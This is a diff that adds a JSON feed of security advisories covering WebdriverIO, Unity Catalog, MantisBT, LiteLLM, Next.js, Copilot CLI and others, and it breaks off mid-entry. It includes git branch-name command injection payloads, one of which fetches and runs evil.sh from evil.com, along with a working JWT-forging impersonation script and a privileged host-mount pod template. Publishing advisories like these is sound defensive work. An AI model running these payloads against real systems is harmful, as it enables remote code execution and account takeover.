@@ -1,5 +1,434 @@
 {
-  "candidate_count": 0,
-  "candidates": [],
-  "correlated_at": "2026-05-11T18:58:53.755610+00:00"
+  "candidate_count": 15,
+  "candidates": [
+    {
+      "canonical_id": "CVE-2026-25244",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-78"
+      ],
+      "description": "### Summary\nA command injection vulnerability exists in `@wdio/browserstack-service` that allows remote code execution (RCE) when processing git branch names in test orchestration. An attacker can exploit this by providing a malicious git repository with a branch name containing shell command injection payloads.\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### Vulnerable Code\n**File**:  https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204\n\n### Root Cause\nUser-controlled git branch names are directly interpolated into `execSync()` calls without sanitization. Git allows branch names to contain special characters ,that can be used for command injection.\nGit allows to create these branches.\n```\ngit checkout -b \"main;touch\\${IFS}/tmp/pwned.txt;echo\\${IFS}PWNED\"\ngit checkout -b \"main;rm\\${IFS}/tmp/pwned.txt;echo\\${IFS}PWNED\"\ngit checkout -b \"main;curl\\${IFS}evil.com/evil.sh\\${IFS}>/tmp/evil.sh;bash\\${IFS}/tmp/evil.sh;echo\\${IFS}PWNED\"\n```\n\n\n### Attack Vector\n1. Attacker creates a malicious git repository with a branch name containing command injection payload\n2. Attacker configures WebdriverIO to use this repository via `testOrchestrationOptions.runSmartSelection.source`. if `source` is not provided it takes current directory as `source`.\n3. When `getGitMetadataForAISelection()` executes, it extracts the malicious branch name\n4. Branch name is interpolated into shell commands without sanitization\n5. Shell interprets special characters and executes attacker's commands\n\n### PoC\n### Step 1: Create Malicious Repository Branch\n```\ngit checkout -b \"main;touch\\${IFS}/tmp/pwned.txt;echo\\${IFS}PWNED\"\n```\n\n### Step 2: Configure WebdriverIO\n\n```javascript\n// wdio.conf.js\nexport const config = {\n    services: [\n        ['browserstack', {\n            user: process.env.BROWSERSTACK_USERNAME,\n            key: process.env.BROWSERSTACK_ACCESS_KEY,\n            testOrchestrationOptions: {\n                runSmartSelection: {\n                    enabled: true,\n                    source: ['/tmp/malicious-repo']  // \u26a0\ufe0f Points to malicious repo, without \"source\" field, it runs in the current directory.\n                }\n            }\n        }]\n    ],\n    // ... rest of config\n}\n```\n### Step 3: Run Tests\n\n```bash\nnpm run wdio\n```\n### Step 4: Verify RCE\n\n```bash\n# Check if file was created (proof of RCE)\nls -la /tmp/pwned.txt\n```\n\n### Impact\n\n- **Remote Code Execution** on CI/CD servers or developer machines\n- **Information Disclosure** (environment variables, secrets, credentials)\n- **Data Exfiltration** (source code, SSH keys, configuration files)\n- **System Compromise** (backdoor installation, lateral movement)\n- **Supply Chain Attack** (modify build artifacts)",
+      "first_seen": "2026-05-11T19:05:16.252220+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252220+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-5c46-x3qw-q7j7",
+        "https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204",
+        "https://github.com/webdriverio/webdriverio/releases/tag/v9.24.0",
+        "https://github.com/webdriverio/webdriverio/security/advisories/GHSA-5c46-x3qw-q7j7"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "WebdriverIO BrowserStack Service has a Command Injection issue"
+    },
+    {
+      "canonical_id": "CVE-2026-27478",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1390",
+        "CWE-290",
+        "CWE-346"
+      ],
+      "description": "**Context:**\nA critical authentication bypass vulnerability exists in the Unity Catalog token exchange endpoint (/api/1.0/unity-control/auth/tokens). The endpoint extracts the issuer (iss) claim from incoming JWTs and uses it to dynamically fetch the JWKS endpoint for signature validation without validating that the issuer is a trusted identity provider.\n\n**Way to exploit:**\n\nAn attacker can exploit this by:\n1. Hosting their own OIDC-compliant server with a valid JWKS endpoint\n2. Signing a JWT with their own private key, setting the iss claim to their server\n3. Setting the sub/email claim to any known user in the Unity Catalog system\n4. Exchanging this crafted token for a valid internal access token\n\nThis results in complete impersonation of any user in the system, granting access to all catalogs, schemas, tables, and other resources that user has permissions to.\n\nAdditionally, the implementation does not validate the audience (aud) claim, allowing tokens intended for other services to be used.\n\n**Example**\n\nExample implementation doing token exchange with a self hosted `.well-known/openid-configuration` and `jwks` endpoint.\n\nThis can be run with `python3 main.py` and `TARGET_USER`, `UC_SERVER` and `PORT` adjusted to the testing setup.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Unity Catalog JWT Issuer Validation Bypass PoC - Minimal Version\"\"\"\n\nimport base64, secrets, threading, time\nfrom datetime import datetime, timedelta, timezone\nimport jwt, requests\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom flask import Flask, jsonify\n\nTARGET_USER = \"user@example.com\"\nUC_SERVER = \"http://localhost:8080\"\nPORT = 8888\nISSUER = f\"http://localhost:{PORT}\"\n\n# Generate RSA key pair\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\nkid = secrets.token_hex(8)\n\n# Create JWKS\npub = key.public_key().public_numbers()\ndef b64(n): return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8, \"big\")).rstrip(b\"=\").decode()\njwks = {\"keys\": [{\"kty\": \"RSA\", \"use\": \"sig\", \"alg\": \"RS256\", \"kid\": kid, \"n\": b64(pub.n), \"e\": b64(pub.e)}]}\n\n# Create malicious JWT\ntoken = jwt.encode(\n    {\"iss\": ISSUER, \"sub\": TARGET_USER, \"email\": TARGET_USER, \"aud\": \"unity-catalog\",\n     \"iat\": datetime.now(timezone.utc), \"exp\": datetime.now(timezone.utc) + timedelta(hours=1)},\n    key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()),\n    algorithm=\"RS256\", headers={\"kid\": kid}\n)\n\n# Start minimal OIDC server\napp = Flask(__name__)\napp.logger.disabled = True\n\n@app.route(\"/.well-known/openid-configuration\")\ndef oidc(): return jsonify({\"issuer\": ISSUER, \"jwks_uri\": f\"{ISSUER}/jwks\"})\n\n@app.route(\"/jwks\")\ndef keys(): return jsonify(jwks)\n\nthreading.Thread(target=lambda: app.run(port=PORT, threaded=True, use_reloader=False), daemon=True).start()\ntime.sleep(1)\n\n# Exchange token\nresp = requests.post(f\"{UC_SERVER}/api/1.0/unity-control/auth/tokens\",\n                     data={\"grant_type\": \"urn:ietf:params:oauth:grant-type:token-exchange\",\n                           \"requested_token_type\": \"urn:ietf:params:oauth:token-type:access_token\",\n                           \"subject_token_type\": \"urn:ietf:params:oauth:token-type:id_token\",\n                           \"subject_token\": token})\n\nif resp.status_code == 200:\n    access_token = resp.json()[\"access_token\"]\n    print(f\"[+] Got access token as '{TARGET_USER}'\")\n    # Demo: list catalogs\n    catalogs = requests.get(f\"{UC_SERVER}/api/2.1/unity-catalog/catalogs\",\n                            headers={\"Authorization\": f\"Bearer {access_token}\"})\n    print(catalogs.json())\nelse:\n    print(f\"[-] Failed: {resp.status_code} {resp.text}\")\n```",
+      "first_seen": "2026-05-11T19:05:16.252187+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252187+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-qqcj-rghw-829x",
+        "https://github.com/unitycatalog/unitycatalog/releases/tag/v0.4.1",
+        "https://github.com/unitycatalog/unitycatalog/security/advisories/GHSA-qqcj-rghw-829x",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-27478"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Unity Catalog has a JWT Issuer Validation Bypass tht Allows Complete User Impersonation"
+    },
+    {
+      "canonical_id": "CVE-2026-33052",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-639"
+      ],
+      "description": "MantisBT allows a low-privileged authenticated user having *add_profile_threshold* to create a global profile despite not having *manage_global_profile_threshold*, by tampering with the user_id parameter in a valid profile creation request.\n\n### Impact\nAuthentication bypass\n\n### Patches\n- 3f952e68fa864e0e60abc3e84adecf3cfa84c75e\n\n### Workarounds\nNone\n\n### Credits\nThanks to Vishal Shukla for discovering and responsibly reporting the issues.",
+      "first_seen": "2026-05-11T19:05:16.252155+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252155+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-68w5-w573-q2r8",
+        "https://github.com/mantisbt/mantisbt/commit/3f952e68fa864e0e60abc3e84adecf3cfa84c75e",
+        "https://github.com/mantisbt/mantisbt/releases/tag/release-2.28.2",
+        "https://github.com/mantisbt/mantisbt/security/advisories/GHSA-68w5-w573-q2r8",
+        "https://mantisbt.org/bugs/view.php?id=36974"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "MantisBT Has Authorization Bypass in Global Profile Creation"
+    },
+    {
+      "canonical_id": "CVE-2026-40217",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-420",
+        "CWE-913"
+      ],
+      "description": "### Impact\n\nThe `POST /guardrails/test_custom_code` endpoint runs user-supplied Python inside a hand-rolled sandbox. The sandbox can be escaped using bytecode-level techniques, allowing arbitrary code execution in the proxy process \u2014 which runs as root in the default Docker image.\n\n**Reaching the endpoint requires a proxy-admin credential** in default configurations.\n\n### Patches\n\nFixed in **`1.83.11`**. The hand-rolled sandbox has been replaced with `RestrictedPython`. Upgrade to `1.83.11` or later.\n\n### Workarounds\n\nIf upgrading is not immediately possible, block `POST /guardrails/test_custom_code` at your reverse proxy or API gateway.\n\n### References\n\n- Patched release: [`v1.83.10-stable`](https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable)",
+      "first_seen": "2026-05-11T19:05:16.252431+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252431+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable",
+        "https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p",
+        "https://github.com/advisories/GHSA-wxxx-gvqv-xp7p",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-40217",
+        "https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "LiteLLM has a sandbox escape in custom-code guardrail"
+    },
+    {
+      "canonical_id": "CVE-2026-44516",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-532"
+      ],
+      "description": "### Summary\n\nThe `LoggingRestClientCustomizer` in the `web` module automatically intercepts all outgoing HTTP calls made via Spring's `RestClient` and logs the full request body, response body, and response headers. When an error response is received, this information is included in the thrown `HttpClientErrorException` message, which is logged at ERROR level by Spring's default exception handling \u2014 regardless of the application's DEBUG log level setting.\n\n### Impact\n\nThe logged data can contain highly sensitive information including:\n- Authentication credentials (JWT tokens, API keys, OAuth tokens) in request bodies or response headers\n- Personal data (BSN, email addresses, case details) in request/response bodies\n- Session tokens in `Set-Cookie` response headers\n\nThis data is exposed to:\n- Anyone with access to application logs (stdout/log files)\n- Users with access to logging aggregation tools (e.g. Grafana/Loki)\n- Any Valtimo user with the admin role, through the built-in logging module (since Valtimo 12.5.0)\n\nLeaked authentication credentials could be used to impersonate the Valtimo application against the target external API (e.g. ZGW services), compromising that API's security boundary.\n\nRelated: GHSA-hfrg-mcvw-8mch (similar sensitive data exposure in InboxHandlingService)\n\n### Affected Code\n\n`com.ritense.valtimo.web.logging.LoggingRestClientCustomizer#intercept` in the `web` module.\n\n### Patched Versions\n\nThe vulnerability is fixed in:\n- **12.33.0** (v12 release line) \u2014 see PR #600\n- **13.26.0** (v13 release line) \u2014 see PR #599\n\nThe fix removes the request/response report, headers, and response body from the `HttpClientErrorException` constructor; only the HTTP status code and status text remain. The full request/response report is still emitted at DEBUG level (disabled in production).\n\n### Mitigation\n\nIf you cannot upgrade to a patched version immediately, consider:\n- Restricting access to application logs and the Valtimo logging module\n- Adjusting the log level for `com.ritense.valtimo.web.logging` to WARN or higher (note: this only mitigates the DEBUG logging path; error responses still leak data via the exception message)",
+      "first_seen": "2026-05-11T19:05:16.252757+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252757+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-3jh5-rr2q-xfv7",
+        "https://github.com/valtimo-platform/valtimo/pull/599",
+        "https://github.com/valtimo-platform/valtimo/pull/600",
+        "https://github.com/valtimo-platform/valtimo/security/advisories/GHSA-3jh5-rr2q-xfv7"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Valtimo has sensitive data exposure through HTTP request/response logging in LoggingRestClientCustomizer"
+    },
+    {
+      "canonical_id": "CVE-2026-44521",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-89"
+      ],
+      "description": "## Summary\n\nAn authenticated SQL injection vulnerability in the elFinder MySQL volume driver (`elFinderVolumeMySQL`) allows any logged-in user, including users with read-only access to the affected volume, to inject SQL through a crafted `target` file hash. Successful exploitation can lead to unauthorized data disclosure and denial of service.\n\nThis vulnerability only affects installations configured to use the `MySQL` volume driver. Installations using the default `LocalFileSystem` driver are not affected.\n\n## Description\n\nA vulnerability in elFinder's MySQL volume driver (`elFinderVolumeMySQL`) allows authenticated SQL injection through a crafted file hash passed via the `target` parameter.\n\nThe issue is caused by two behaviors working together:\n1. File hashes are decoded without validating that the decoded value is a valid MySQL object identifier.\n2. The decoded value is then used in MySQL driver queries, including `cacheDir()`, `_joinPath()`, `_stat()`, and `_fopen()`.\n\nBecause the MySQL storage schema uses numeric `id` and `parent_id` values, an authenticated user can supply a crafted hash that alters the intended SQL query logic. Successful exploitation can lead to unauthorized data disclosure and denial of service. The extent of impact depends on the privileges granted to the configured MySQL account.\n\nThis vulnerability only affects installations configured to use the `MySQL` volume driver. Installations using the default `LocalFileSystem` driver are not affected.\n\n## Impact\n\nAn authenticated user, including a user with read-only access to the affected volume, can exploit this issue to:\n- disclose data accessible to the configured MySQL account, including file contents stored by the driver and database metadata\n- trigger denial of service through expensive or unexpectedly broad query results that can lead to excessive memory consumption\n\nThe severity of data exposure depends on the privileges granted to the configured MySQL account.",
+      "first_seen": "2026-05-11T19:05:16.252716+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252716+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/Studio-42/elFinder/security/advisories/GHSA-c3gj-q88f-7hqj",
+        "https://github.com/advisories/GHSA-c3gj-q88f-7hqj"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "elFinder MySQL has a SQL Injection in its Volume Driver (elFinderVolumeMySQL)"
+    },
+    {
+      "canonical_id": "CVE-2026-44543",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1336"
+      ],
+      "description": "### Impact\n\nA malicious user with permission to edit the `local-path-config` ConfigMap in the `local-path-storage` namespace can manipulate the `helperPod.yaml` template used by `rancher/local-path-provisioner`.\n\nThe `helperPod.yaml` template is loaded by the provisioner and used to create HelperPods during PVC provisioning and cleanup operations. However, the template is not sufficiently validated before use. Security-sensitive fields such as `securityContext.privileged`, `hostPath` volumes, and Linux capabilities can be injected into the template.\n\nExample malicious HelperPod template:\n\n~~~yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: helper-pod\nspec:\n  containers:\n  - name: helper-pod\n    image: docker.io/kindest/local-path-helper:v20230510-486859a6\n    imagePullPolicy: IfNotPresent\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n      type: Directory\n~~~\n\nWhen a PVC operation triggers HelperPod creation, the provisioner creates the HelperPod using the attacker-controlled template. This can result in a privileged pod running on the target node with the host root filesystem mounted.\n\nThis may allow the attacker to access sensitive host files, read ServiceAccount tokens from other pods on the same node, access other tenants' local-path volume data, or modify files on the host node.\n\nExpected Behavior:\n\n- The HelperPod template should not allow privileged containers.\n- The HelperPod template should not allow arbitrary `hostPath` mounts.\n- Security-sensitive fields in `helperPod.yaml` should be validated or rejected before the provisioner creates HelperPods.\n\n### Patches\n\nThis vulnerability is addressed by validating the HelperPod template loaded from the `local-path-config` ConfigMap before it is used to create HelperPods.\n\nThe fix ensures that unsafe fields such as privileged security contexts, hostPath volumes, and other dangerous pod security settings are rejected. This prevents an attacker with ConfigMap edit permission from injecting a malicious HelperPod template that grants access to the host node.\n\nPreviously, a malicious user could modify `helperPod.yaml` to cause the provisioner to create a privileged HelperPod with the host root filesystem mounted, potentially leading to node-level compromise and ServiceAccount token theft.\n\nWith this fix, HelperPod templates containing unsafe security-sensitive fields are denied, and only safe HelperPod configurations are accepted.\n\nPatched versions of local-path-provisioner include releases v0.0.34 and later.\n\nNo patches are provided for earlier releases, as they do not include the necessary HelperPod template validation logic.\n\n### Workarounds\n\nUsers should upgrade to a patched version of local-path-provisioner to fully mitigate this vulnerability.\n\nAs a temporary mitigation, users can restrict write access to the `local-path-config` ConfigMap in the `local-path-storage` namespace. Only trusted administrators should be allowed to update this ConfigMap.\n\nUsers may also mark the ConfigMap as immutable after deployment:\n\n~~~bash\nkubectl -n local-path-storage patch configmap local-path-config \\\n  --type merge -p '{\"immutable\": true}'\n~~~\n\nAdditionally, enabling Kubernetes Pod Security Admission for the `local-path-storage` namespace can provide defense in depth. For example, enforcing the `baseline` policy can prevent privileged HelperPods from being created even if the template is modified:\n\n~~~bash\nkubectl label namespace local-path-storage \\\n  pod-security.kubernetes.io/enforce=baseline \\\n  pod-security.kubernetes.io/warn=restricted\n~~~\n\nThese mitigations reduce the risk of exploitation, but upgrading to a patched release is required to fully address the issue.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\n- Contact the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.",
+      "first_seen": "2026-05-11T19:05:16.252634+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252634+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-7fxv-8wr2-mfc4",
+        "https://github.com/rancher/local-path-provisioner/security/advisories/GHSA-7fxv-8wr2-mfc4"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Local Path Provisioner Vulnerable to HelperPod Template Injection"
+    },
+    {
+      "canonical_id": "CVE-2026-44572",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-349"
+      ],
+      "description": "### Impact\n\nNext.js uses the `x-nextjs-data` request header for internal data requests. On affected versions, an external client could send this header on a normal request to a path handled by middleware that returns a redirect.\n\nWhen that happened, the middleware/proxy could treat the request as a data request and replace the standard `Location` redirect header with the internal `x-nextjs-redirect` header. Browsers do not follow `x-nextjs-redirect`, so the response became an unusable redirect for normal clients.\n\nIf the application was deployed behind a CDN or reverse proxy that caches 3xx responses without varying on this header, a single attacker request could poison the cached redirect response for the affected path. Subsequent visitors could then receive a cached redirect response without a `Location` header, causing a denial of service for that redirect path until the cache entry expired or was purged.\n\n### Affected scenarios\n\nThis affects applications that:\n- use middleware or proxy redirects\n- are deployed behind a caching CDN or reverse proxy\n- allow 3xx responses on those paths to be cached without differentiating internal data requests from normal requests\n\n### Fix\n\nThe fix stops trusting `x-nextjs-data` by itself for middleware redirect handling. A request is now treated as an internal data request only when it is validated as such by internal routing state, preserving legitimate data-request redirect behavior while preventing external header injection from changing normal redirect responses.\n\n### Workarounds\n\nBefore upgrading, users can reduce risk by:\n- configuring the CDN or reverse proxy to vary its cache key on `x-nextjs-data` for affected responses",
+      "first_seen": "2026-05-11T19:05:16.252653+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252653+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-3g8h-86w9-wvmq",
+        "https://github.com/vercel/next.js/releases/tag/v15.5.16",
+        "https://github.com/vercel/next.js/releases/tag/v16.2.5",
+        "https://github.com/vercel/next.js/security/advisories/GHSA-3g8h-86w9-wvmq"
+      ],
+      "severity": "low",
+      "source_count": 1,
+      "title": "Next.js's Middleware / Proxy redirects can be cache-poisoned"
+    },
+    {
+      "canonical_id": "CVE-2026-44575",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-288"
+      ],
+      "description": "### Impact\n\n\nIt was found that the fix addressing [CVE-2026-44575](https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f) did not apply to `middleware.ts` with Turbopack. Refer to  [CVE-2026-44575](https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f) for further details.\n\n### References \n\n- [CVE CVE-2026-44575](https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f)",
+      "first_seen": "2026-05-11T19:05:16.252273+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252273+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-26hh-7cqf-hhc6",
+        "https://github.com/vercel/next.js/releases/tag/v15.5.18",
+        "https://github.com/vercel/next.js/releases/tag/v16.2.6",
+        "https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f",
+        "https://github.com/vercel/next.js/security/advisories/GHSA-26hh-7cqf-hhc6"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Next.js has a Middleware / Proxy bypass in App Router applications via segment-prefetch routes - Incomplete Fix Follow-Up"
+    },
+    {
+      "canonical_id": "CVE-2026-44643",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-95"
+      ],
+      "description": "## Impact\n\nAn attacker can write a malicious expression that escapes the sandbox to execute arbitrary code on the system.\n\nExample of vulnerable code:\n\n```\nconst expressions = require(\"angular-expressions\");\nconst result = expressions.compile(\"a | __proto__\")({}, {});\n```\n\nThis should throw the error : Filter '__proto__' is not defined, however, this shows : \n\nUncaught SyntaxError: Unexpected identifier 'Object'\n\nWith a more complex (undisclosed) payload, one can get full access to Arbitrary code execution on the system.\n\n## Vulnerable versions : \n\nangular-expressions <= 1.5.1\n\n## Patches\n\nThe problem has been patched in version 1.5.2 of angular-expressions.\n\n## Credits\n\nCredits go to San Gil from [www.securityoffice.io](https://securityoffice.io/) who has found the issue and reported it to us.",
+      "first_seen": "2026-05-11T19:05:16.252286+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252286+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-pw8r-6689-xvf4",
+        "https://github.com/peerigon/angular-expressions/security/advisories/GHSA-pw8r-6689-xvf4"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Angular Expressions - Remote Code Execution using filters"
+    },
+    {
+      "canonical_id": "CVE-2026-45033",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-696"
+      ],
+      "description": "## Summary\n\nA security vulnerability has been identified in GitHub Copilot CLI where a malicious bare git repository nested inside a project directory can achieve arbitrary code execution when the agent performs git operations. By exploiting git's automatic bare repository discovery during directory traversal, an attacker can set `core.fsmonitor` or other executable config keys to run arbitrary commands without user awareness or approval.\n\n## Details\n\nGit supports bare repositories \u2014 repositories without a working tree \u2014 which can be discovered automatically when git traverses the directory hierarchy looking for a `.git` directory. When git discovers a bare repository, it reads and applies its configuration, including keys that specify external commands to execute.\n\nThe vulnerability arises because git's `core.fsmonitor` config key (and 15+ similar keys such as `core.hookspath`, `diff.external`, `merge.tool`, etc.) can specify arbitrary shell commands that git will execute as part of normal operations like `status`, `diff`, or `rev-parse`.\n\n### Attack Scenario\n\nAn attacker can exploit this by:\n\n1. Creating a bare git repository nested inside a seemingly normal project directory (e.g., `vendor/malicious.git/` or a deeply nested subdirectory)\n2. Configuring `core.fsmonitor` (or similar keys) in that bare repository to execute a malicious command\n3. When GitHub Copilot CLI performs any git operation that traverses into or through that directory, git auto-discovers the bare repository, reads its config, and executes the attacker's command\n\nThis can occur when:\n- The agent navigates into a subdirectory containing the buried bare repo\n- The agent runs `git status`, `git diff`, or other routine git commands\n- The agent uses tools like `grep` or `glob` that may trigger git operations in subdirectories\n\nPrior to the fix, the CLI had no protection against git auto-discovering bare repositories during directory traversal.\n\n## Impact\n\nAn attacker who can place a malicious bare repository inside a project \u2014 for example, through:\n- A pull request adding a directory that contains a bare repository\n- A compromised or malicious dependency that includes a bare repository\n- A cloned repository that already contains nested bare repositories\n\n\u2014 could achieve arbitrary code execution on the user's workstation whenever GitHub Copilot CLI performs git operations in or near the malicious directory.\n\nSuccessful exploitation could lead to data exfiltration, credential theft, file modification, or further system compromise.\n\n## Affected Versions\n\n- GitHub Copilot CLI versions prior to 1.0.42\n\n## Remediation and Mitigation\n\n### Fix\n\nThe fix sets `safe.bareRepository=explicit` via git's `GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_*` / `GIT_CONFIG_VALUE_*` environment variable mechanism, which has the highest precedence over all config file sources. This prevents git from automatically discovering and using bare repositories during directory traversal \u2014 only explicitly allowlisted bare repositories will be used.\n\n### User Actions\n\n1. **Upgrade** GitHub Copilot CLI to **1.0.43** or later.\n2. **Exercise caution** when working in repositories that contain nested bare git repositories.\n3. **Review** project directories for unexpected bare repositories, especially in `vendor/`, `third_party/`, or deeply nested subdirectories.",
+      "first_seen": "2026-05-11T19:05:16.252611+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252611+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-9ccr-r5hg-74gf",
+        "https://github.com/github/copilot-cli/security/advisories/GHSA-9ccr-r5hg-74gf"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "GitHub Copilot CLI: Nested Bare Repository Can Execute Arbitrary Commands via core.fsmonitor"
+    },
+    {
+      "canonical_id": "CVE-2026-45047",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-400"
+      ],
+      "description": "### Summary\nThe `apiHandler` (and similarly `webHandlerTelegramBot`) processes user-provided JSON payloads by directly using `json.NewDecoder(r.Body).Decode(&request)` without restricting the maximum read size. An unauthenticated remote attacker can stream an extremely large, endless JSON payload (e.g., several Gigabytes of padding) over a single TCP connection. Because Go's JSON decoder attempts to allocate memory for the entire parsed structure, this rapidly exhausts the host's physical RAM or container limits, leading to an unrecoverable `fatal error: runtime: out of memory`. \n\nThis causes the Linux OOM Killer to instantly terminate the entire `bird-lg-go` daemon, resulting in a severe Remote Denial of Service (RDoS).\n\n### Details\nIn `api.go`:\n```go\nfunc apiHandler(w http.ResponseWriter, r *http.Request) {\n    var request apiRequest\n    // VULNERABILITY: No http.MaxBytesReader protection before JSON decode\n    err := json.NewDecoder(r.Body).Decode(&request) \n    // ...",
+      "first_seen": "2026-05-11T19:05:16.252414+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-11T19:05:16.252414+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-39qr-rc93-vhqm",
+        "https://github.com/xddxdd/bird-lg-go/commit/0ff87024cb9ed01fc5f5fdc6f4603fce4c123922",
+        "https://github.com/xddxdd/bird-lg-go/releases/tag/v1.4.5",
+        "https://github.com/xddxdd/bird-lg-go/security/advisories/GHSA-39qr-rc93-vhqm"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Bird-lg-go has a Fatal Out-of-Memory (OOM) Denial of Service via Unbounded JSON Decoding"
+    },
+    {
+      "canonical_id": "CVE-2026-45061",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
